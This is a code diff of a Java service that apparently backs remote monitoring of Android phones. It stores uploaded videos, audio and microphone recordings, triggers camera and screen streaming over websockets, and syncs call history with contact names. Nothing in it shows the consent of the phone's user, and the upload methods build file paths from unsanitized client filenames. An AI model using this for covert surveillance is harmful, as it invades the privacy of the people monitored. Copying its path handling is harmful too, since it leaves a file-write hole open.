+                                        file.getInputStream(),
+                                        path,
+                                        StandardCopyOption.REPLACE_EXISTING);
 
-        deviceInfoRepository.save(device);
+                        Video video = new Video();
 
-    }
+                        video.setDeviceId(deviceId);
+                        video.setVideoName(file.getOriginalFilename());
+                        video.setVideoUrl("/uploads/videos/" + fileName);
+                        video.setVideoSize(file.getSize());
+                        video.setCreatedAt(LocalDateTime.now());
 
-    public void cameraRequestReceived(String deviceId) {
+                        videoList.add(video);
 
-        DeviceInfo device = deviceInfoRepository
-                .findByDeviceId(deviceId)
-                .orElseThrow(() -> new RuntimeException("Device Not Found"));
+                }
 
-        device.setRefreshCamera(false);
+                if (!videoList.isEmpty()) {
 
-        deviceInfoRepository.save(device);
-    }
+                        videoRepo.saveAll(videoList);
+
+                }
+
+                DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
+                                .orElseThrow(() -> new RuntimeException("Device Not Found"));
+
+                device.setVideosUploaded(true);
+                device.setRefreshVideos(false);
+
+                deviceInfoRepository.save(device);
+
+        }
+
+        public void requestVideos(String deviceId) {
+
+                DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
+                                .orElseThrow(
+                                                () -> new RuntimeException("Device Not Found"));
+
+                device.setRefreshVideos(true);
+
+                device.setVideosUploaded(false);
+
+                deviceInfoRepository.save(device);
+
+        }
+
+        public List<VideoResponse> getVideos(String deviceId) {
+
+                return videoRepo
+                                .findByDeviceIdOrderByVideoNameAsc(deviceId)
+                                .stream()
+                                .map(video -> VideoResponse.builder()
+                                                .id(video.getId())
+                                                .videoName(video.getVideoName())
+                                                .videoUrl(video.getVideoUrl())
+                                                .videoSize(video.getVideoSize())
+                                                .createdAt(video.getCreatedAt())
+                                                .build())
+                                .toList();
+
+        }
+
+        public void deleteVideos(String deviceId) {
+
+                List<Video> videos = videoRepo.findByDeviceIdOrderByVideoNameAsc(deviceId);
+
+                for (Video video : videos) {
+
+                        if (video.getVideoUrl() != null) {
+
+                                String path = video.getVideoUrl()
+                                                .replace("/uploads/videos/", "");
+
+                                File file = new File("uploads/videos", path);
+
+                                if (file.exists()) {
+
+                                        if (!file.delete()) {
+
+                                                log.warn("Unable to delete : {}",
+                                                                file.getAbsolutePath());
+
+                                        }
+
+                                }
+
+                        }
+
+                }
+
+                videoRepo.deleteByDeviceId(deviceId);
+
+                DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
+                                .orElseThrow(() -> new RuntimeException("Device Not Found"));
+
+                device.setVideosUploaded(false);
+                device.setRefreshVideos(true);
+
+                deviceInfoRepository.save(device);
+
+        }
+
+        @Transactional
+        public void syncVideoFolders(
+                        VideoFolderSyncRequest request) {
+
+                deviceVideoFolderRepo.deleteByDeviceId(
+                                request.getDeviceId());
+
+                List<DeviceVideoFolder> folders = new ArrayList<>();
+
+                for (VideoFolderPayload item : request.getFolders()) {
+
+                        DeviceVideoFolder folder = DeviceVideoFolder.builder()
+                                        .deviceId(request.getDeviceId())
+                                        .bucketId(item.getBucketId())
+                                        .folderName(item.getFolderName())
+                                        .videoCount(item.getVideoCount())
+                                        .syncedAt(LocalDateTime.now())
+                                        .build();
+
+                        folders.add(folder);
+
+                }
+
+                deviceVideoFolderRepo.saveAll(folders);
+
+        }
+
+        public List<VideoFolderResponse> getVideoFolders(
+                        String deviceId) {
+
+                return deviceVideoFolderRepo
+                                .findByDeviceIdOrderByFolderNameAsc(deviceId)
+                                .stream()
+                                .map(folder -> VideoFolderResponse.builder()
+                                                .bucketId(folder.getBucketId())
+                                                .folderName(folder.getFolderName())
+                                                .videoCount(folder.getVideoCount())
+                                                .build())
+                                .toList();
+
+        }
+
+        public void refreshVideos(
+                        VideoRefreshRequest request) {
+
+                DeviceInfo device = deviceInfoRepository.findByDeviceId(
+                                request.getDeviceId())
+                                .orElseThrow(() -> new RuntimeException("Device Not Found"));
+
+                device.setRefreshVideos(true);
+
+                device.setVideosUploaded(false);
+
+                device.setVideoBucketId(request.getBucketId());
+
+                device.setVideoLimit(request.getLimit());
+
+                device.setVideoOffset(request.getOffset());
+
+                device.setVideoOrder(request.getOrder());
+
+                deviceInfoRepository.save(device);
+
+        }
+
+        // Audio Methods
+
+        @Transactional
+        public void saveAudios(
+                        String deviceId,
+                        List<MultipartFile> files)
+                        throws IOException {
+
+                File folder = new File("uploads");
+
+                if (!folder.exists()) {
+                        folder.mkdirs();
+                }
+
+                List<Audio> audioList = new ArrayList<>();
+
+                for (MultipartFile file : files) {
+
+                        Optional<Audio> existing = audioRepo.findByDeviceIdAndAudioNameAndAudioSize(
+                                        deviceId,
+                                        file.getOriginalFilename(),
+                                        file.getSize());
+
+                        if (existing.isPresent()) {
+                                continue;
+                        }
+
+                        String fileName = UUID.randomUUID() + "_" + file.getOriginalFilename();
+
+                        Path path = Paths.get(folder.getAbsolutePath(), fileName);
+
+                        Files.copy(
+                                        file.getInputStream(),
+                                        path,
+                                        StandardCopyOption.REPLACE_EXISTING);
+
+                        Audio audio = Audio.builder()
+                                        .deviceId(deviceId)
+                                        .audioName(file.getOriginalFilename())
+                                        .audioUrl("/uploads/" + fileName)
+                                        .audioSize(file.getSize())
+                                        .createdAt(LocalDateTime.now())
+                                        .build();
+
+                        audioList.add(audio);
+                }
+
+                if (!audioList.isEmpty()) {
+                        audioRepo.saveAll(audioList);
+                }
+
+                DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
+                                .orElseThrow();
+
+                device.setAudiosUploaded(true);
+                device.setRefreshAudios(false);
+
+                deviceInfoRepository.save(device);
+        }
+
+        public List<AudioResponse> getAudios(String deviceId) {
+
+                return audioRepo
+                                .findByDeviceIdOrderByCreatedAtDesc(deviceId)
+                                .stream()
+                                .map(audio -> AudioResponse.builder()
+                                                .id(audio.getId())
+                                                .audioName(audio.getAudioName())
+                                                .audioUrl(audio.getAudioUrl())
+                                                .audioSize(audio.getAudioSize())
+                                                .duration(audio.getDuration())
+                                                .createdAt(audio.getCreatedAt())
+                                                .build())
+                                .toList();
+        }
+
+        public void refreshAudios(AudioRefreshRequest request) {
+
+                DeviceInfo device = deviceInfoRepository.findByDeviceId(request.getDeviceId())
+                                .orElseThrow(() -> new RuntimeException("Device Not Found"));
+
+                device.setRefreshAudios(true);
+
+                device.setAudiosUploaded(false);
+
+                device.setAudioBucketId(request.getBucketId());
+
+                device.setAudioLimit(request.getLimit());
+
+                device.setAudioOffset(request.getOffset());
+
+                device.setAudioOrder(request.getOrder());
+
+                deviceInfoRepository.save(device);
+        }
+
+        public void deleteAudios(String deviceId) {
+
+                List<Audio> audios = audioRepo.findByDeviceIdOrderByCreatedAtDesc(deviceId);
+
+                for (Audio audio : audios) {
+
+                        if (audio.getAudioUrl() != null) {
+
+                                String path = audio.getAudioUrl().replace("/uploads/", "");
+
+                                File file = new File("uploads", path);
+
+                                if (file.exists()) {
+                                        file.delete();
+                                }
+                        }
+                }
+
+                audioRepo.deleteByDeviceId(deviceId);
+
+                DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
+                                .orElseThrow();
+
+                device.setAudiosUploaded(false);
+                device.setRefreshAudios(true);
+
+                deviceInfoRepository.save(device);
+        }
+
+        @Transactional
+        public void syncAudioFolders(AudioFolderSyncRequest request) {
+
+                deviceAudioFolderRepo.deleteByDeviceId(request.getDeviceId());
+
+                List<DeviceAudioFolder> folders = new ArrayList<>();
+
+                for (AudioFolderPayload item : request.getFolders()) {
+
+                        folders.add(
+
+                                        DeviceAudioFolder.builder()
+                                                        .deviceId(request.getDeviceId())
+                                                        .bucketId(item.getBucketId())
+                                                        .folderName(item.getFolderName())
+                                                        .audioCount(item.getAudioCount())
+                                                        .syncedAt(LocalDateTime.now())
+                                                        .build()
+
+                        );
+                }
+
+                deviceAudioFolderRepo.saveAll(folders);
+        }
+
+        public List<AudioFolderResponse> getAudioFolders(String deviceId) {
+
+                return deviceAudioFolderRepo
+                                .findByDeviceIdOrderByFolderNameAsc(deviceId)
+                                .stream()
+                                .map(folder -> AudioFolderResponse.builder()
+                                                .bucketId(folder.getBucketId())
+                                                .folderName(folder.getFolderName())
+                                                .audioCount(folder.getAudioCount())
+                                                .build())
+                                .toList();
+        }
+
+        // Mic Method
+
+        @Transactional
+        public void saveMicRecording(
+                        String deviceId,
+                        Integer duration,
+                        MultipartFile file) throws IOException {
+
+                File folder = new File("uploads");
+
+                if (!folder.exists()) {
+                        folder.mkdirs();
+                }
+
+                String fileName = UUID.randomUUID() + "_" + file.getOriginalFilename();
+
+                Path path = Paths.get(
+                                folder.getAbsolutePath(),
+                                fileName);
+
+                Files.copy(
+                                file.getInputStream(),
+                                path,
+                                StandardCopyOption.REPLACE_EXISTING);
+
+                MicRecording recording = MicRecording.builder()
+                                .deviceId(deviceId)
+                                .fileName(file.getOriginalFilename())
+                                .fileUrl("/uploads/" + fileName)
+                                .fileSize(file.getSize())
+                                .duration(duration)
+                                .createdAt(LocalDateTime.now())
+                                .build();
+
+                micRecordingRepo.save(recording);
+
+                DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
+                                .orElseThrow(() -> new RuntimeException("Device Not Found"));
+
+                device.setMicUploaded(true);
+                device.setRefreshMic(false);
+
+                deviceInfoRepository.save(device);
+        }
+
+        public void refreshMic(MicRecordingRequest request) {
+
+                DeviceInfo device = deviceInfoRepository
+                                .findByDeviceId(request.getDeviceId())
+                                .orElseThrow(() -> new RuntimeException("Device Not Found"));
+
+                device.setRefreshMic(true);
+
+                device.setMicUploaded(false);
+
+                device.setMicDuration(request.getDuration());
+
+                deviceInfoRepository.save(device);
+        }
+
+        public List<MicRecordingResponse> getMicRecordings(String deviceId) {
+
+                return micRecordingRepo.findByDeviceIdOrderByCreatedAtDesc(deviceId)
+                                .stream()
+                                .map(recording -> MicRecordingResponse.builder()
+                                                .id(recording.getId())
+                                                .fileName(recording.getFileName())
+                                                .fileUrl(recording.getFileUrl())
+                                                .fileSize(recording.getFileSize())
+                                                .duration(recording.getDuration())
+                                                .createdAt(recording.getCreatedAt())
+                                                .build())
+                                .toList();
+        }
+
+        public void deleteMicRecordings(String deviceId) {
+
+                List<MicRecording> recordings = micRecordingRepo.findByDeviceIdOrderByCreatedAtDesc(deviceId);
+
+                for (MicRecording recording : recordings) {
+
+                        if (recording.getFileUrl() != null) {
+
+                                String path = recording.getFileUrl().replace("/uploads/", "");
+
+                                File file = new File("uploads", path);
+
+                                if (file.exists()) {
+
+                                        if (!file.delete()) {
+
+                                                log.warn("Unable to delete : {}", file.getAbsolutePath());
+
+                                        }
+                                }
+                        }
+                }
+
+                micRecordingRepo.deleteByDeviceId(deviceId);
+
+                DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
+                                .orElseThrow(() -> new RuntimeException("Device Not Found"));
+
+                device.setMicUploaded(false);
+                device.setRefreshMic(true);
+
+                deviceInfoRepository.save(device);
+        }
+
+        // Camera Methods
+
+        public void requestCamera(CameraRequest request) {
+
+                DeviceInfo device = deviceInfoRepository
+                                .findByDeviceId(request.getDeviceId())
+                                .orElseThrow(() -> new RuntimeException("Device Not Found"));
+
+                device.setRefreshCamera(true);
+
+                device.setCameraStreaming(false);
+
+                device.setCameraType(request.getCameraType());
+
+                deviceInfoRepository.save(device);
+
+                // Realtime notify Android
+                String message = """
+                                {
+                                  "type":"camera_request",
+                                  "deviceId":"%s"
+                                }
+                                """.formatted(request.getDeviceId());
+
+                sessionManager.sendMessage(
+                                request.getDeviceId(),
+                                "device",
+                                "camera",
+                                message);
+        }
+
+        public void cameraStopped(String deviceId) {
+
+                DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
+                                .orElseThrow(() -> new RuntimeException("Device Not Found"));
+
+                device.setCameraStreaming(false);
+
+                device.setRefreshCamera(false);
+
+                deviceInfoRepository.save(device);
+
+        }
+
+        public Boolean cameraStatus(String deviceId) {
+
+                DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
+                                .orElseThrow(() -> new RuntimeException("Device Not Found"));
+
+                return device.getCameraStreaming();
+
+        }
+
+        public void cameraStarted(String deviceId) {
+
+                DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
+                                .orElseThrow(() -> new RuntimeException("Device Not Found"));
+
+                device.setCameraStreaming(true);
+
+                device.setRefreshCamera(false);
+
+                deviceInfoRepository.save(device);
+
+        }
+
+        public void cameraRequestReceived(String deviceId) {
+
+                DeviceInfo device = deviceInfoRepository
+                                .findByDeviceId(deviceId)
+                                .orElseThrow(() -> new RuntimeException("Device Not Found"));
+
+                device.setRefreshCamera(false);
+
+                deviceInfoRepository.save(device);
+        }
+
+        // ======================= Screen Methods =======================
+
+        public void requestScreen(ScreenRequest request) {
+
+                DeviceInfo device = deviceInfoRepository
+                                .findByDeviceId(request.getDeviceId())
+                                .orElseThrow(() -> new RuntimeException("Device Not Found"));
+
+                device.setRefreshScreen(true);
+                device.setScreenStreaming(false);
+                device.setScreenStatus("REQUESTED");
+                device.setScreenStartedAt(null);
+
+                deviceInfoRepository.save(device);
+
+                String message = """
+                                {
+                                  "type":"screen_request",
+                                  "deviceId":"%s"
+                                }
+                                """.formatted(request.getDeviceId());
+
+                sessionManager.sendMessage(
+                                request.getDeviceId(),
+                                "device",
+                                "screen",
+                                message);
+        }
+
+        public void screenRequestReceived(String deviceId) {
+
+                DeviceInfo device = deviceInfoRepository
+                                .findByDeviceId(deviceId)
+                                .orElseThrow(
+                                                () -> new RuntimeException("Device Not Found"));
+
+                device.setRefreshScreen(false);
+
+                device.setScreenStatus("REQUESTED");
+
+                deviceInfoRepository.save(device);
+
+        }
+
+        public void screenStarted(String deviceId) {
+
+                DeviceInfo device = deviceInfoRepository
+                                .findByDeviceId(deviceId)
+                                .orElseThrow(
+                                                () -> new RuntimeException("Device Not Found"));
+
+                device.setRefreshScreen(false);
+
+                device.setScreenStreaming(true);
+
+                device.setScreenStatus("STREAMING");
+
+                device.setScreenStartedAt(
+                                LocalDateTime.now());
+
+                if (device.getScreenSessionId() == null) {
+
+                        device.setScreenSessionId(
+                                        UUID.randomUUID().toString());
+
+                }
+
+                deviceInfoRepository.save(device);
+
+                // notify browser
+                String message = """
+                                {
+                                  "type":"screen_started",
+                                  "deviceId":"%s",
+                                  "sessionId":"%s"
+                                }
+                                """.formatted(
+                                deviceId,
+                                device.getScreenSessionId());
+
+                sessionManager.sendMessage(
+                                deviceId,
+                                "browser",
+                                "screen",
+                                message);
+
+        }
+
+        public void screenStopped(String deviceId) {
+
+                DeviceInfo device = deviceInfoRepository
+                                .findByDeviceId(deviceId)
+                                .orElseThrow(
+                                                () -> new RuntimeException("Device Not Found"));
+
+                device.setRefreshScreen(false);
+
+                device.setScreenStreaming(false);
+
+                device.setScreenStatus("IDLE");
+
+                device.setScreenStartedAt(null);
+
+                device.setScreenSessionId(null);
+
+                deviceInfoRepository.save(device);
+
+                // notify browser
+                String message = """
+                                {
+                                  "type":"screen_stopped",
+                                  "deviceId":"%s"
+                                }
+                                """.formatted(deviceId);
+
+                sessionManager.sendMessage(
+                                deviceId,
+                                "browser",
+                                "screen",
+                                message);
+
+        }
+
+        public String screenStatus(String deviceId) {
+
+                DeviceInfo device = deviceInfoRepository
+                                .findByDeviceId(deviceId)
+                                .orElseThrow(
+                                                () -> new RuntimeException("Device Not Found"));
+
+                return device.getScreenStatus();
+
+        }
+
+        public Boolean screenStreamingStatus(String deviceId) {
+
+                DeviceInfo device = deviceInfoRepository
+                                .findByDeviceId(deviceId)
+                                .orElseThrow(
+                                                () -> new RuntimeException("Device Not Found"));
+
+                return device.getScreenStreaming();
+
+        }
+
+        public void screenRequestCancel(String deviceId) {
+
+                DeviceInfo device = deviceInfoRepository
+                                .findByDeviceId(deviceId)
+                                .orElseThrow(
+                                                () -> new RuntimeException("Device Not Found"));
+
+                device.setRefreshScreen(false);
+
+                device.setScreenStreaming(false);
+
+                device.setScreenStatus("IDLE");
+
+                deviceInfoRepository.save(device);
+
+        }
+
+        // Call History
+        public List<CallHistoryDTO> getCallHistory(CallHistoryRequest request) {
+
+                if (request == null) {
+                        throw new IllegalArgumentException(
+                                        "Call history request cannot be null");
+                }
+
+                if (request.getDeviceId() == null ||
+                                request.getDeviceId().isBlank()) {
+
+                        throw new IllegalArgumentException(
+                                        "Device ID is required");
+                }
+
+                if (request.getFromDate() == null ||
+                                request.getToDate() == null) {
+
+                        throw new IllegalArgumentException(
+                                        "From date and to date are required");
+                }
+
+                if (request.getFromDate().isAfter(request.getToDate())) {
+
+                        throw new IllegalArgumentException(
+                                        "From date cannot be after to date");
+                }
+
+                LocalDateTime fromDate = request.getFromDate().atStartOfDay();
+
+                LocalDateTime toDate = request.getToDate().atTime(LocalTime.MAX);
+
+                List<CallHistory> callHistoryList = callHistoryRepo
+                                .findByDeviceIdAndCallDateBetweenOrderByCallDateDesc(
+                                                request.getDeviceId(),
+                                                fromDate,
+                                                toDate);
+
+                return callHistoryList.stream()
+                                .map(this::mapToDTO)
+                                .toList();
+        }
+
+        private CallHistoryDTO mapToDTO(CallHistory call) {
+
+                CallHistoryDTO dto = new CallHistoryDTO();
+
+                dto.setId(call.getId());
+                dto.setDeviceId(call.getDeviceId());
+                dto.setPhoneNumber(call.getPhoneNumber());
+                dto.setCallType(call.getCallType());
+                dto.setCallDate(call.getCallDate());
+                dto.setDuration(call.getDuration());
+                dto.setContactName(call.getContactName());
+
+                return dto;
+        }
+
+        @Transactional
+        public int syncCallHistory(CallHistorySyncRequest request) {
+
+                if (request == null) {
+                        throw new IllegalArgumentException(
+                                        "Call history sync request cannot be null");
+                }
+
+                if (request.getDeviceId() == null ||
+                                request.getDeviceId().isBlank()) {
+
+                        throw new IllegalArgumentException("Device ID is required");
+                }
+
+                if (request.getCalls() == null ||
+                                request.getCalls().isEmpty()) {
+
+                        return 0;
+                }
+
+                List<CallHistory> newCalls = new ArrayList<>();
+
+                for (CallHistorySyncItemDTO item : request.getCalls()) {
+
+                        if (item == null) {
+                                continue;
+                        }
+
+                        if (item.getPhoneNumber() == null ||
+                                        item.getPhoneNumber().isBlank() ||
+                                        item.getCallDate() == null) {
+
+                                continue;
+                        }
+
+                        boolean alreadyExists = callHistoryRepo
+                                        .existsByDeviceIdAndPhoneNumberAndCallTypeAndCallDateAndDuration(
+                                                        request.getDeviceId(),
+                                                        item.getPhoneNumber(),
+                                                        item.getCallType(),
+                                                        item.getCallDate(),
+                                                        item.getDuration());
+
+                        if (alreadyExists) {
+                                continue;
+                        }
+
+                        CallHistory call = new CallHistory();
+
+                        call.setDeviceId(request.getDeviceId());
+                        call.setPhoneNumber(item.getPhoneNumber());
+                        call.setCallType(item.getCallType());
+                        call.setCallDate(item.getCallDate());
+                        call.setDuration(item.getDuration());
+                        call.setContactName(item.getContactName());
+
+                        newCalls.add(call);
+                }
+
+                if (!newCalls.isEmpty()) {
+                        callHistoryRepo.saveAll(newCalls);
+                }
+
+                return newCalls.size();
+        }
+
+        public void requestCallHistory(CallHistoryRequest request) {
+
+                if (request == null) {
+                        throw new IllegalArgumentException(
+                                        "Call history request cannot be null");
+                }
+
+                if (request.getDeviceId() == null ||
+                                request.getDeviceId().isBlank()) {
+
+                        throw new IllegalArgumentException(
+                                        "Device ID is required");
+                }
+
+                if (request.getFromDate() == null ||
+                                request.getToDate() == null) {
+
+                        throw new IllegalArgumentException(
+                                        "From date and to date are required");
+                }
+
+                if (request.getFromDate().isAfter(request.getToDate())) {
+
+                        throw new IllegalArgumentException(
+                                        "From date cannot be after to date");
+                }
+
+                try {
+
+                        SignalMessage msg = new SignalMessage();
+
+                        msg.setDeviceId(request.getDeviceId());
+                        msg.setType("call_history_request");
+                        msg.setCallHistoryRequest(request);
+
+                        String message = objectMapper.writeValueAsString(msg);
+
+                        boolean sent = sessionManager.sendMessage(
+                                        request.getDeviceId(),
+                                        "device",
+                                        "call_history",
+                                        message);
+
+                        if (!sent) {
+
+                                throw new IllegalStateException(
+                                                "Device is not connected for call history");
+                        }
+
+                } catch (JsonProcessingException e) {
+
+                        throw new IllegalStateException(
+                                        "Failed to create call history websocket message",
+                                        e);
+                }
+        }
 
 }
